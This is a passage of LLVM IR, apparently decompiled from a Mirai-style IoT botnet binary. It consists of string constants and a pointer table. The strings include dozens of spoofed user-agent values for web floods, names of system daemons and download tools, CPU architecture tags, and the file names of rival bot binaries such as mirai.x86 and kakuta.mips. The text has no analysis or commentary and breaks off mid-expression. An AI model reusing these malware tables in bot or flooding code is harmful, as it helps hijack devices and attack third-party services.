@global_var_10015534.358 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910R4 USCC Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBr\00"
@global_var_100155b0.359 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2\00"
@global_var_1001562c.360 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mob\00"
@global_var_100156a8.361 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_100156ec.362 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_10015730.363 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36\00"
@global_var_100157a4.364 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10015818.365 = constant [117 x i8] c"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\00"
@global_var_10015890.366 = constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36\00"
@global_var_10015904.367 = constant [79 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\00"
@global_var_10015954.368 = constant [121 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\00"
@global_var_100159d0.369 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\00"
@global_var_10015a44.370 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.1.2883.83 Secure/55.1.2883.373 Saf\00"
@global_var_10015ac0.371 = constant [137 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36\00"
@global_var_10015b4c.372 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_10015b98.373 = constant [267 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-N910A Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Instagram 10.5.1 Android (22/5.1.1; 640dpi; 1440x2560; samsung; SAMSUNG-SM-N910A; trlteatt; qcom; en_US)\00"
@global_var_10015ca4.374 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_10015ce4.375 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_10015d24.376 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_10015db4.377 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_10015dec.378 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_10015e0c.379 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_10015e24.380 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_10015e7c.381 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_10015f1c.382 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_10015f70.383 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_10015fe4.384 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_10016024.385 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_100160dc.386 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10016130.387 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10016188.388 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_100161e0.389 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10016220.390 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10016268.391 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_100162c0.392 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1001632c.393 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_10016384.394 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_100163d4.395 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_100163f8.396 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_10016454.397 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_10016464.398 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_10016494.399 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_100164b8.400 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_100164dc.401 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_100164f8.402 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10016538.403 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100165c4.404 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1001660c.405 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10016654.406 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1001669c.407 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_100166e4.408 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_10016738.409 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_10016788.410 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_100167f4.411 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_10016848.412 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_100168a4.413 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_10016900.414 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_10016964.415 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_100169c0.416 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016a1c.417 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016a78.418 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10016ad8.419 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_10016b20.420 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_10016bb8.421 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_10016c04.422 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016c50.423 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_10016ca0.424 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_10016ce8.425 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_10016d3c.426 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_10016d8c.427 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_10016dd4.428 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_10016e20.429 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_10016e6c.430 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_10016eb4.431 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016f04.432 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_10016f54.433 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016f88.434 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10016fbc.435 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_10017004.436 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_10017010.437 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1001701c.438 = constant [6 x i8] c"jhUOH\00"
@global_var_10017024.439 = constant [8 x i8] c"RYrydry\00"
@global_var_1001702c.440 = constant [9 x i8] c"UYyuyioy\00"
@global_var_10017038.441 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_10017044.442 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_10017050.443 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1001705c.444 = constant [8 x i8] c"FDFDHFC\00"
@global_var_10017064.445 = constant [9 x i8] c"FTUdftui\00"
@global_var_10017070.446 = constant [4 x i8] c"[M]\00"
@global_var_10017074.447 = constant [5 x i8] c"[MS]\00"
@global_var_1001707c.448 = constant [5 x i8] c"[SH]\00"
@global_var_10017084.449 = constant [6 x i8] c"[x86]\00"
@global_var_1001708c.450 = constant [5 x i8] c"[A6]\00"
@global_var_10017094.451 = constant [5 x i8] c"[I6]\00"
@global_var_1001709c.452 = constant [6 x i8] c"[PPC]\00"
@global_var_100170a4.453 = constant [5 x i8] c"[I5]\00"
@global_var_100170ac.454 = constant [6 x i8] c"[M68]\00"
@global_var_100170b4.455 = constant [4 x i8] c"[S]\00"
@global_var_100170b8.456 = constant [5 x i8] c"[A4]\00"
@global_var_100170c0.457 = constant [5 x i8] c"[A5]\00"
@global_var_100170c8.458 = constant [10 x i8] c"[PPC-440]\00"
@global_var_100170d4.459 = constant [8 x i8] c"[A4-EB]\00"
@global_var_100170dc.460 = constant [8 x i8] c"[A4-TL]\00"
@global_var_100170e4.461 = constant [5 x i8] c"[I4]\00"
@global_var_100170ec.462 = constant [6 x i8] c"[M64]\00"
@global_var_100170f4.463 = constant [5 x i8] c"ntpd\00"
@global_var_100170fc.464 = constant [5 x i8] c"sshd\00"
@global_var_10017104.465 = constant [8 x i8] c"openssh\00"
@global_var_1001710c.466 = constant [5 x i8] c"bash\00"
@global_var_10017114.467 = constant [5 x i8] c"tftp\00"
@global_var_1001711c.468 = constant [5 x i8] c"wget\00"
@global_var_10017124.469 = constant [5 x i8] c"cron\00"
@global_var_1001712c.470 = constant [4 x i8] c"ftp\00"
@global_var_10017130.471 = constant [5 x i8] c"pftp\00"
@global_var_1001713c.472 = constant [6 x i8] c"[cpu]\00"
@global_var_10017144.473 = constant [8 x i8] c"apache2\00"
@global_var_1001714c.474 = constant [8 x i8] c"telnetd\00"
@global_var_10017154.475 = constant [5 x i8] c"mips\00"
@global_var_1001715c.476 = constant [7 x i8] c"mipsel\00"
@global_var_10017164.477 = constant [4 x i8] c"sh4\00"
@global_var_10017168.478 = constant [4 x i8] c"x86\00"
@global_var_1001716c.479 = constant [5 x i8] c"i686\00"
@global_var_10017174.480 = constant [5 x i8] c"i586\00"
@global_var_1001717c.481 = constant [4 x i8] c"ppc\00"
@global_var_10017180.482 = constant [5 x i8] c"m68k\00"
@global_var_10017188.483 = constant [11 x i8] c"jackmymips\00"
@global_var_10017194.484 = constant [13 x i8] c"jackmymips64\00"
@global_var_100171a4.485 = constant [13 x i8] c"jackmymipsel\00"
@global_var_100171b4.486 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_100171c0.487 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_100171d0.488 = constant [10 x i8] c"jackmysh4\00"
@global_var_100171dc.489 = constant [10 x i8] c"jackmyx86\00"
@global_var_100171e8.490 = constant [11 x i8] c"jackmyi486\00"
@global_var_100171f4.491 = constant [11 x i8] c"jackmyi586\00"
@global_var_10017200.492 = constant [11 x i8] c"jackmyi686\00"
@global_var_1001720c.493 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_1001721c.494 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_10017230.495 = constant [11 x i8] c"jackmym68k\00"
@global_var_1001723c.496 = constant [12 x i8] c"jackmysparc\00"
@global_var_10017248.497 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_10017254.498 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_10017264.499 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_10017270.500 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_1001727c.501 = constant [7 x i8] c"x86_64\00"
@global_var_10017284.502 = constant [7 x i8] c"armv6l\00"
@global_var_1001728c.503 = constant [8 x i8] c"powerpc\00"
@global_var_10017294.504 = constant [6 x i8] c"sparc\00"
@global_var_1001729c.505 = constant [7 x i8] c"armv4l\00"
@global_var_100172a4.506 = constant [7 x i8] c"armv5l\00"
@global_var_100172ac.507 = constant [14 x i8] c"powerpc-440fp\00"
@global_var_100172bc.508 = constant [8 x i8] c"botmips\00"
@global_var_100172c4.509 = constant [10 x i8] c"botmipsel\00"
@global_var_100172d0.510 = constant [7 x i8] c"botsh4\00"
@global_var_100172d8.511 = constant [10 x i8] c"botx86_64\00"
@global_var_100172e4.512 = constant [10 x i8] c"botarmv6l\00"
@global_var_100172f0.513 = constant [8 x i8] c"boti686\00"
@global_var_100172f8.514 = constant [11 x i8] c"botpowerpc\00"
@global_var_10017304.515 = constant [8 x i8] c"boti586\00"
@global_var_1001730c.516 = constant [8 x i8] c"botm68k\00"
@global_var_10017314.517 = constant [9 x i8] c"botsparc\00"
@global_var_10017320.518 = constant [10 x i8] c"botarmv4l\00"
@global_var_1001732c.519 = constant [10 x i8] c"botarmv5l\00"
@global_var_10017338.520 = constant [16 x i8] c"botpowerpc440fp\00"
@global_var_10017348.521 = constant [9 x i8] c"iluvmips\00"
@global_var_10017354.522 = constant [11 x i8] c"dannytyzoh\00"
@global_var_10017360.523 = constant [10 x i8] c"igisamzin\00"
@global_var_1001736c.524 = constant [15 x i8] c"Ihaveablackpup\00"
@global_var_1001737c.525 = constant [10 x i8] c"Armv4lkek\00"
@global_var_10017388.526 = constant [10 x i8] c"Armv5lkek\00"
@global_var_10017394.527 = constant [10 x i8] c"Armv6lkek\00"
@global_var_100173a0.528 = constant [8 x i8] c"i686kek\00"
@global_var_100173a8.529 = constant [7 x i8] c"ppckek\00"
@global_var_100173b0.530 = constant [11 x i8] c"motorcycle\00"
@global_var_100173bc.531 = constant [7 x i8] c"m68kek\00"
@global_var_100173c4.532 = constant [9 x i8] c"sparckek\00"
@global_var_100173d0.533 = constant [11 x i8] c"ponydicks1\00"
@global_var_100173dc.534 = constant [11 x i8] c"ponydicks2\00"
@global_var_100173e8.535 = constant [11 x i8] c"ponydicks3\00"
@global_var_100173f4.536 = constant [11 x i8] c"ponydicks4\00"
@global_var_10017400.537 = constant [11 x i8] c"ponydicks5\00"
@global_var_1001740c.538 = constant [11 x i8] c"ponydicks6\00"
@global_var_10017418.539 = constant [11 x i8] c"ponydicks7\00"
@global_var_10017424.540 = constant [11 x i8] c"ponydicks8\00"
@global_var_10017430.541 = constant [11 x i8] c"ponydicks9\00"
@global_var_1001743c.542 = constant [12 x i8] c"ponydicks10\00"
@global_var_10017448.543 = constant [12 x i8] c"ponydicks11\00"
@global_var_10017454.544 = constant [12 x i8] c"kakuta.mips\00"
@global_var_10017460.545 = constant [12 x i8] c"kakuta.mpsl\00"
@global_var_1001746c.546 = constant [11 x i8] c"kakuta.sh4\00"
@global_var_10017478.547 = constant [11 x i8] c"kakuta.x86\00"
@global_var_10017484.548 = constant [12 x i8] c"kakuta.arm4\00"
@global_var_10017490.549 = constant [12 x i8] c"kakuta.arm5\00"
@global_var_1001749c.550 = constant [12 x i8] c"kakuta.arm6\00"
@global_var_100174a8.551 = constant [12 x i8] c"kakuta.i686\00"
@global_var_100174b4.552 = constant [11 x i8] c"kakuta.ppc\00"
@global_var_100174c0.553 = constant [12 x i8] c"kakuta.i586\00"
@global_var_100174cc.554 = constant [12 x i8] c"kakuta.m68k\00"
@global_var_100174d8.555 = constant [13 x i8] c"kakuta.sparc\00"
@global_var_100174e8.556 = constant [11 x i8] c"shinto.x86\00"
@global_var_100174f4.557 = constant [12 x i8] c"shinto.mips\00"
@global_var_10017500.558 = constant [12 x i8] c"shinto.mpsl\00"
@global_var_1001750c.559 = constant [12 x i8] c"shinto.arm4\00"
@global_var_10017518.560 = constant [12 x i8] c"shinto.arm5\00"
@global_var_10017524.561 = constant [12 x i8] c"shinto.arm6\00"
@global_var_10017530.562 = constant [12 x i8] c"shinto.arm7\00"
@global_var_1001753c.563 = constant [11 x i8] c"shinto.ppc\00"
@global_var_10017548.564 = constant [11 x i8] c"shinto.spc\00"
@global_var_10017554.565 = constant [12 x i8] c"shinto.m68k\00"
@global_var_10017560.566 = constant [11 x i8] c"shinto.sh4\00"
@global_var_1001756c.567 = constant [12 x i8] c"shintoo.x86\00"
@global_var_10017578.568 = constant [13 x i8] c"shintoo.mips\00"
@global_var_10017588.569 = constant [13 x i8] c"shintoo.mpsl\00"
@global_var_10017598.570 = constant [12 x i8] c"shintoo.arm\00"
@global_var_100175a4.571 = constant [13 x i8] c"shintoo.arm5\00"
@global_var_100175b4.572 = constant [13 x i8] c"shintoo.arm6\00"
@global_var_100175c4.573 = constant [13 x i8] c"shintoo.arm7\00"
@global_var_100175d4.574 = constant [12 x i8] c"shintoo.ppc\00"
@global_var_100175e0.575 = constant [24 x i8] c"shintoo.spcshintoo.m68k\00"
@global_var_100175f8.576 = constant [12 x i8] c"shintoo.sh4\00"
@global_var_10017604.577 = constant [10 x i8] c"mirai.x86\00"
@global_var_10017610.578 = constant [12 x i8] c"miraint.x86\00"
@global_var_1001761c.579 = constant [11 x i8] c"mirai.mips\00"
@global_var_10017628.580 = constant [13 x i8] c"miraint.mips\00"
@global_var_10017638.581 = constant [11 x i8] c"mirai.mpsl\00"
@global_var_10017644.582 = constant [13 x i8] c"miraint.mpsl\00"
@global_var_10017654.583 = constant [10 x i8] c"mirai.arm\00"
@global_var_10017660.584 = constant [12 x i8] c"miraint.arm\00"
@global_var_1001766c.585 = constant [12 x i8] c"mirai.arm5n\00"
@global_var_10017678.586 = constant [14 x i8] c"miraint.arm5n\00"
@global_var_10017688.587 = constant [11 x i8] c"mirai.arm7\00"
@global_var_10017694.588 = constant [13 x i8] c"miraint.arm7\00"
@global_var_100176a4.589 = constant [10 x i8] c"mirai.ppc\00"
@global_var_100176b0.590 = constant [12 x i8] c"miraint.ppc\00"
@global_var_100176bc.591 = constant [10 x i8] c"mirai.spc\00"
@global_var_100176c8.592 = constant [12 x i8] c"miraint.spc\00"
@global_var_100176d4.593 = constant [11 x i8] c"mirai.m68k\00"
@global_var_100176e0.594 = constant [13 x i8] c"miraint.m68k\00"
@global_var_100176f0.595 = constant [10 x i8] c"mirai.sh4\00"
@global_var_100176fc.596 = constant [12 x i8] c"miraint.sh4\00"
@global_var_10014918.600 = constant [8 x i8] c"busybox\00"
@global_var_1002b2e4.607 = global [162 x i8*] [i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017004.436, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017010.437, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001701c.438, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017024.439, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001702c.440, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017038.441, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017044.442, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017050.443, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001705c.444, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017064.445, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017070.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017074.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001707c.448, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017084.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001708c.450, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017094.451, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001709c.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170a4.453, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100170ac.454, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100170b4.455, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170b8.456, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170c0.457, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100170c8.458, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100170d4.459, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100170dc.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170e4.461, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100170ec.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170f4.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100170fc.464, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017104.465, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001710c.466, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017114.467, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001711c.468, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017124.469, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001712c.470, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017130.471, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017138.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001713c.472, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017144.473, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001714c.474, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017154.475, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001715c.476, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017164.477, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017168.478, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001716c.479, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017174.480, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001717c.481, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017180.482, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017188.483, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017194.484, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100171a4.485, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100171b4.486, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100171c0.487, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100171d0.488, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100171dc.489, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100171e8.490, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100171f4.491, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017200.492, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001720c.493, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1001721c.494, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017230.495, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001723c.496, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017248.497, i32 0, i32 0), i8* getelementptr 